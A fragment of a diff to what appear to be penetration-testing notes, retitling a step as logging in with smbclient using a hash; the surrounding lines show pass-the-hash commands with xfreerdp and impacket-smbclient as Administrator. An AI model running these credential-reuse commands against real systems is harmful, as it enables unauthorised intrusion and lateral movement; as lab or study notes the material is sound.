@@ -53,7 +53,7 @@ xfreerdp /v:192.168.44.163 /u:Administrator /pth:<NTLM>
 ```
 
 
-using smbclient to login :
+using smbclient to login using hash :
 ```bash
 impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>
 ```
